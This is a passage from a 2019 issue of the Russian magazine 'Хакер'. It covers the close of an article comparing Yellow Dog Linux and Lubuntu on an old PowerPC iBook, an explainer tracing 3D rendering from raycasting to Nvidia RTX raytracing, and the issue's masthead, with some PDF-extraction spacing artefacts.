Konqueror и несколько про игрывателей для различных типов медиаконтента.





                  Ин терфейс Yellow Dog Linux

По субъективным ощущениям производительность Yellow Dog намного выше
OS X 10.5 на том же самом железе, но, в отличие от операционки Apple, здесь
далеко не все работает «из короб ки». Нап ример, на моем айбуке не завел ся
беспроводной адаптер Airport и воз никли траблы со сме ной активной рас‐
кладки клавиатуры — такая возможность прос то отсутствовала, нес мотря
на то что русская раскладка была подключена еще на этапе установки сис‐
темы.
  Проблема с клавиату рой решилась дос таточно просто: оказалось, нужно
перейти в панель «Пуск → Настройки → Модули» и включить автоматичес кую
загрузку модуля Language. В его окне можно указать сочетание клавиш
для переключения национальной раскладки (правда, на моем iBook этот
модуль по непонятной причине раз в полчаса вылетал с ошибкой).
  С Wi‐Fi все оказалось сложнее. Что бы бес проводной адаптер заработал,
нужно скачать и установить для него проприетарные драй веры, которые
в базовый комплект пос тавки не входят. Для этого обычно используют спе‐
циальную утилиту b43‐fwcutter, только вот в нашем случае раздобыть ее ока‐
залось не так уж и прос то: все репозитории Yellow Dog давным‐давно вымер‐
ли, как динозавры, а нам нужна версия, собранная под архитектуру PowerPC
и к тому же совместимая с Red Hat / CentOS.
  Найти b43‐fwcutter в готовом виде мне так и не удалось, потому настроить
Airport без танцев с бубном не получилось. Вмес то этого я по старинке вот‐
кнул в ноут присоединенный к роутеру патчкорд, чтобы хоть как‐то проверить
работу интерне та. Работа эта совсем не порадовала: старый Firefox адек‐
ватно тянуть современные сайты отказался, с не менее древним Konqueror
дела обстояли не намного лучше.


ПРОМЕЖУТОЧНЫЙ ВЫВОД
Эта фаза эксперимента была признана мною в целом неудачной. Несмотря
на то что Yellow Dog Linux крутился на моем ноут буке фантастически шустро,
отсутствие сов ременного софта, древние бра узеры, дохлые репозитории
и невозможность запустить все устройства «из коробки» без неуместного
шаманства делали работу в этой системе сущим мучением. Наверное, чисто
технически можно соб рать для YDL нужный набор актуальных программ
из исходников, найти недос тающие драй веры и «допилить сис тему напиль‐
ником» до работоспособного состояния, но мне стало попросту неохота
с этим возиться. «Так жить нельзя», — решил я, после чего снес Yellow Dog
Linux с жесткого диска к чертовой бабуш ке.


ПОПЫТКА НОМЕР ДВА: LUBUNTU
В зоопарке дистрибутивов Ubuntu, как я случайно выяснил при поисках драй‐
веров, имеется версия и для PowerPC, причем относительно све жая —
Lubuntu 16.04. Порт для РРС считается «неофициальным» и не под держивает‐
ся Canonical, о чем в его описании сделана скромная пометка. Наверное,
именно поэтому ссылки на ресурсы загрузки и соответс твующие зеркала
на сайте Ubuntu предсказуемо ведут в никуда. Тем не менее я, проявив упо‐
ротость упорство и настой чивость, таки нашел живой раздел, откуда пока
еще можно загрузить ISO‐образ для DVD.
  Водружение Lubuntu на iBook в целом не представляет никакой слож‐
ности: в точности так же, как и в предыду щем слу чае, дожидаемся приг‐
лашения загрузчика yaboot, жмем Return и идем пить кофе, пока на экране
не появится графический интерфейс Live CD, из которого можно запустить
программу установки. Сама процеду ра инсталляции традиционна для Ubuntu
и хорошо знакома каждому, кто хотя бы раз в жизни устанавливал эту сис тему
на своем компьюте ре. Не нужно даже менять раз метку дисковых разделов: я
выбрал вариант по умолчанию «снести все напрочь», после чего ОС прек‐
расно установилась, перезаг рузилась и запус тилась практически без моего
участия.





                  Lubuntu на iBook — выглядит кра сиво!

Программ в ком плек те поставки тут значительно меньше, чем в Yellow Dog
Linux: есть браузер Firefox, мес сенджер Pidgin, проигры ватель GNOME Mplay‐
er, простенький текстовый редактор Leafpad и не менее простенький гра‐
фический — mtPaint. Работает Lubuntu по сравнению с YDL заметно мед‐
леннее, но все же терпимо. Главное — работает! Никаких глюков, зависаний
и аварийных остановок приложений замечено не было, что меня очень
порадовало. А вот беспро водная сеть, нес мотря на то что при установке я
выбрал использование проприетарных драйверов, работать снова не захоте‐
ла. Внутри у iBook беспроводной адаптер Broadcom, точную модель которого
можно выяснить сле дующей терминаль ной командой:



  # lspci | grep ‐i Broadcom


В моем случае терминал выдал такой ответ:



  0001:10:12.0 Network controller: Broadcom Corporation BCM4318 [AirForce
  One
  54g] 802.11g Wireless LAN Controller (rev 02)


Дальше, руководствуясь инструкциями из интернета, можно попытаться уста‐
новить bcm43xx‐fwcutter и соответству ющие драйверы, но я решил не парить‐
ся и вместо этого просто воткнул в USB‐порт первый попавшийся Wi‐Fi‐адап‐
тер из коробки со старыми компьютер ными запчастя ми. Адаптер — вот
чудо! — внезапно зарабо тал сам по себе без пля сок с бубном.
   Весь остальной необ ходимый для работы софт отлично устанавливается
с помощью «Цен тра приложений Lubuntu» — репозитории для этой версии
системы  прекрасно работают.  Да, смот реть  в  окне браузера  ролики
на YouTube все равно не получается — из‐за слабого железа Firefox тормозит
и лагает, но я скачал Minitube и юзал при необ ходимости эту прекрасную ути‐
литу.


ОКОНЧАТЕЛЬНЫЕ ВЫВОДЫ
Если сравнивать три ОС, которые я поочередно протестировал на своем
iBook, общие результаты этих экспериментов можно свести в сле дующую
таблицу.


       1. Быстро действие

      OS X 10.5 Leopard: -

        Yellow Dog Linux 6.2: +

       Lubuntu 16.04: -


       2. Стабильность

      OS X 10.5 Leopard: +

        Yellow Dog Linux 6.2: -

       Lubuntu 16.04: +


       3. Современ ный софт

      OS X 10.5 Leopard: -

        Yellow Dog Linux 6.2: -

       Lubuntu 16.04: +


       4. Работающие репозитории

      OS X 10.5 Leopard: -

        Yellow Dog Linux 6.2: -

       Lubuntu 16.04: +


       5. Под держка железа из короб ки

      OS X 10.5 Leopard: +

        Yellow Dog Linux 6.2: -

       Lubuntu 16.04: -


       6. Ак туальность ОС

      OS X 10.5 Leopard: -

        Yellow Dog Linux 6.2: -

       Lubuntu 16.04: +


       7. ИТОГО

      OS X 10.5 Leopard: 2

        Yellow Dog Linux 6.2: 1

       Lubuntu 16.04: 4



Очевидно, что по совокуп ности достоинств Lubuntu можно назвать оптималь‐
ной ОС для использования на старых «Маках». Она столь же неповоротлива,
как «родная» OS X, но в то же время вполне современна и позволяет устанав‐
ливать актуальное ПО, версии которого портирова ны на PPC.
  Выбор софта в «Центре приложений», конечно, более скромный, чем
в Ubuntu для х86‐64, но для непритяза тельного юзера впол не достаточный.
В результате из старого макбука, на котором уста новлена Lubuntu, получа‐
ется неплохая пишущая машинка, поз воляющая без проблем серфить
по интернету, слушать музыку, обмениваться электронной почтой и сочинять
заметки в «Хакер».
  Кроме всего прочего, есть способ добавить айбуку быстродействия.
Для этого следует купить на AliExpress недоро гой SSD‐накопитель формата
mSATA и в комплект к нему — переходник 2,5" mSATA‐IDE за очень небольшие
деньги. После установки такого чудо‐девайса ноут должен летать, как реак‐
тивный самолет. С нетерпением жду дос тавки!
GEEK
   ФИЗИКА
 НЕРЕАЛЬНОГО
    МИРА





       ШКОЛЬНАЯ ПРОГРАММА
     НА СТРАЖЕ СОВРЕМЕННОГО 3D




За последние несколько лет трех мерная
графика сделала большой скачок в раз‐
витии:  качество  и  реалистичность  соз‐
данных компьюте ром изображений  дос‐
тигли высокого уровня, а популярность VR         Михаил Киреев                                                                                           kireevmp@yandex.ru
бьет все рекорды. Но революция в мире
компьютерной графики только началась —
речь о появлении технологий рейтрейсинга
в реальном времени. Давай разберемся,
что это такое, как мы к этому приш ли и как
это работает.


РЕАЛЬНОСТЬ ПРОТИВ ЭФФЕКТИВНОСТИ
Человеческий глаз воспринимает множес тво лучей: прямых — от источников
света — и отраженных от всевоз можных предметов. Камеры фотоаппаратов
очень похожи на сетчатку: каж дый «пиксель» глаза воспринимает излучение,
создающее цвет. Поэтому логичным решением раз работчиков было восполь‐
зоваться законом обратимос ти хода лучей и для каж дого пикселя экрана —
по сути, виртуального гла за — рассчитывать, откуда придет луч света и какого
он будет цвета.
  Наверняка с уроков физики ты помнишь закон отражения све та: угол
падения равен углу отражения. Этот закон поз воляет в корне поменять кон‐
цепцию виртуального мира. Вместо того чтобы рассчитывать мил лиарды
лучей, исходящих от одного источника, имея малень кую надежду, что эти лучи
попадут в виртуальный глаз, компьютер может думать лишь о нес кольких мил‐
лионах лучей (по одному на пиксель экра на), гарантированно важных для соз‐
дания картинки.
  Несмотря на это, во времена зарождения трехмерных компьютерных игр
(а это начало 1980‐х — конец 1990‐х годов) процессоры не были достаточно
мощны, чтобы рассчитывать путь луча для каждого отдельного пикселя,
поэтому разработчики использовали различные хаки — либо уменьшали
количество рассчитываемых пикселей, либо применяли менее физически
обоснованный способ создания картинки. Об  этих уловках мы сейчас
и поговорим.


РЕЙКАСТИНГ
Добиваясь эффектив ности, прог раммисты решились на множес тво допуще‐
ний, которые позволили снизить затраты времени на соз дание изображения
в сотни раз, — это в первую очередь допущения о виртуальном мире.
 1. Все доступное в игре прос транство — это комната с прямоугольными
   (чаще квадратными) стенами.
 2. Нет лестниц, лифтов, любого вида спус ков и подъемов.
 3. Потолок везде имеет одинаковую высоту.
 4. Нет других трехмерных объектов, кроме стен, пола и потолка.
 5. Все остальные сущности — это «билборды», двумерные изображения,
   расположенные в трехмерном прос транстве.

Wolfenstein 3D — первая действитель но популярная игра, разработчики
которой этим восполь зовались.





                    Скриншот игры Wolfenstein 3D

Для каждого вертикального кусочка предназна чен специальный луч, который
двигается маленькими шагами — алго ритм каждый раз проверяет, есть ли
попадание в препятствие. Как только луч заканчива ет свое движение, подсчи‐
тывается количество пройденных шагов, и получается расстояние до стены.
Зная  это  расстояние, мы можем  нарисовать  стену  соответствующей
высоты — чем дальше, тем короче стена.
  Перечисленные допущения приводят к тому, что стены всегда находятся
на одном уровне экрана — ровно посередине, поэто му нарисовать их отно‐
сительно просто.
   У такого типа игр много заметных особенностей. Например, все существа
здесь постоянно повернуты к игроку лицом, так как они не трехмерные, рису‐
ются без использования 3D, на них не пада ют тени.
  Движок Wolfenstein 3D стал большим шагом в компьютерной графике,
но разработчикам было понят но, что такого подхода надолго не хватит.


РАСТЕРИЗАЦИЯ
Желание приблизить картинку к реальному миру пот ребовало в корне изме‐
нить принцип отрисовки. Мощность компьютеров воз росла, и вместо отдель‐
ных лучей, которые попадают исклю чительно в стены, стало возможно
использовать самую простую геометрическую фигуру — тре угольник.
   Треугольник задается тремя отдельными точками, в каждую из которых
возможно отправить виртуальный луч. Треугольник остается самим собой
всегда, даже после попадания из трехмерно го прос транства в двумерное.





            Схематическое отоб ражение предмета на экран

Каждая точка каждого объекта в трехмерном пространстве переводится
в точку на экране, а затем определен ные точки — изначально заданные
в модели  треугольники — соединяются.  Так  получается изображение
исходного объекта.





   Проецирование точки из прос транства на плоскость экрана, вид сбоку

Так как из треугольников можно сос тавить любую фигуру и любой трехмерный
объект, было решено основывать ся на этом, и до сих пор все механизмы рен‐
деринга в реальном времени работают по такому механиз му.


Плюсы и минусы растеризации
За годы развития этого подхода люди разработали тонны усовершенство‐
ваний всех возможных аспектов растеризации. Реалистичные тени на объ‐
ектах, имитация фактуры материалов. Осо бенно стоит отметить комплексный
подход к эффективности: GPU, имеющие тысячи ядер, справляются с легко
распараллеливающимся  процес сом  проектирования  виртуальных  точек
на реальный экран. И если десять лет назад мало какие компьютеры могли
позволить себе выводить 30 кадров в секунду, то сейчас и 60, и 144 кадра
в секунду — не редкость.
   Такой рост производитель ности достигается как благодаря увеличению
производительности видеокарт, так и из‐за программных улучшений: филь‐
трации невидимых объектов, раз биения сцены на более маленькие блоки
и многого другого.
  Однако сама концепция проецирова ния треугольников далека от идеала
и дает некоторые побочные эффекты: изоб ражение может быть угловатым,
нуждается в сглаживании, а что бы добавить в игру зеркало, требуются неимо‐
верные усилия и выдумка.


РЕЙТРЕЙСИНГ
Исправляя все недостатки рас теризации, программисты решили вернуться
к истокам — к отправке лучей света от каждого пикселя экрана в трехмерный
мир. Благодаря сверхвысокой мощности современных графических процес‐
соров и их способ ности параллельной работы, рейтрейсингу дали зеленый
свет.


Прин цип работы рейтрейсин га
Вместо того чтобы идти маленькими шагами, как это было в алгоритме рей‐
кастинга, для рейтрейсинга использует ся вся сила математики.
  Поскольку все существующие трехмерные модели собраны из треуголь‐
ников, нужно было обязательно сохранить обратную совместимость. Для это‐
го надо проверять случай столкновения луча не со стеной, а с треугольником.





          Уравнение прямой — ключ к пониманию рейтрей синга

Здесь P (x  , y  , z ) — это коор динаты камеры (для упрощения процесса        1  1   1   1
обычно нули), а P (x  , y  , z ) — коор динаты пикселя на виртуальном экране.                 2  2  2  2
  Процесс начинается с того, что находится плоскость, в которой лежит тре‐
угольник.





                 Компоненты нор мали плоскости


                        Уравнение плоскости

Так, из трех точек треугольника (Q  , Q  , Q ) и двух точек прямой мы можем                                  1   2   3
получить неизвестный коэффициент уравнения пря мой.



   Неизвестный коэф фициент уравнения прямой в случае, если P (0, 0, 0)                                                                1

Если k > 0, значит, пересечение есть. Необходимо лишь проверить, попадает
ли точ ка пересечения в сам треугольник. И здесь мы вспоминаем школьную
геометрию: сумма внутренних углов треугольника равна 180°.





                            Уг лы в треугольнике

Ключевая черта рейтрейсинга в том, что на одном тре угольнике эта серия
вычислений не заканчивается, ведь некоторые поверхности могут быть зер‐
кальными или просто блес теть. В таком слу чае луч не останавливается,
а отражается от этого треугольника и снова ищет себе цель.
  Помимо отражения, учитываются и другие свойства, присущие натураль‐
ным лучам.


РЕЙТРЕЙСИНГ НА РЕАЛЬНОМ ОБОРУДОВАНИИ
Теперь, когда процесс рендерин га разобран, давай пос мотрим, как это
работает в жизни.
   Возьмем решение Nvidia RTX, которое работает на серии видеокарт
GeForce 20. Несмотря на то что внут реннее строение и механизм работы
видеокарт — боль шой секрет, благода ря спецификациям и статьям в научных
журналах мы можем попытаться понять, что же происходит внутри.
   Конструкция этих видеокарт включает два вида ядер — обычные и тен‐
зорные. Обычные ядра, или, как они наз ваны здесь, CUDA, как и во всех дру‐
гих видеокартах, могут заниматься растеризацией, используя стандартные
шейдеры. Однако, объединяясь в блоки по 64 ядра, CUDA образуют спе‐
циальный блок — ядро, которое способ но выполнять рейтрейсинг, — это RT
core. В каждой видеокарте их количество начина ется от 68.
   Тензорные же ядра, которые в каждой видеокарте исчисляются сотнями,
предназначены для быстрой работы нейронных сетей. Их главная задача
здесь — запуск специальной сети Nvidia — DLSS (Deep Learning Super Sam‐
pling), которая позволяет в режиме реального времени увеличивать раз‐
решение изображения вдвое: создавать из Full HD 4K и убирать шум.
  В первую очередь видеокарта соз дает мно жес тво лучей, которые испуска‐
ются из камеры в сцену, воз вра щаются и создают изображение формата Full
HD, — этим занимаются ядра рейтрейсин га. Затем, с использованием DLSS
и тензорных ядер, из изоб ражения уби рает ся шум, а разрешение увеличи‐
вается вдвое. Полученное изображение будет итоговым, оно появляется
на экране.
  Может показаться, что все эти навороты не нужны, но стоит сравнить
результаты работы, и становится ясно, зачем в эту технологию вкладывались
миллионы долларов и тысячи часов работы ученых и программистов.





               Сравнение рейкас тинга и рейтрей син га

Хотя рейтрейсинг в реальном времени — это толь ко зарождающаяся индус‐
трия, но результат завора живает уже сейчас. Посмотри, например, минутный
ролик в 4K с рендером Battleﬁeld V на RTX. Нам же остается только ждать сле‐
дующего шага в развитии видеокарт, ну или хотя бы пока нынешний уровень
станет по карману.
    №07 (244)
          Андрей Пись мен ный        Илья Русанен          Алексей Глазков
              Главный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                           РЕДАКТОРЫ РУБРИК
          Андрей Пись мен ный        Илья Русанен        Иван «aLLy» Андреев
               pismenny@glc.ru             rusanen@glc.ru         iam@russiansecurity.expert
            Евгений Зобнин          Татьяна Чупрова        Андрей Васильков
                 zobnin@glc.ru              chuprova@glc.ru        the.angstroem@gmail.com
                   Вален тин Холмогоров     Виктор Олейников
                           valentin@holmogorov.ru     fabulous.faberge@yandex.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                               РЕКЛАМА

                                  Анна Яковлева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по под писке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязатель но совпада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редакция
не несет ответственности за содер жание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2019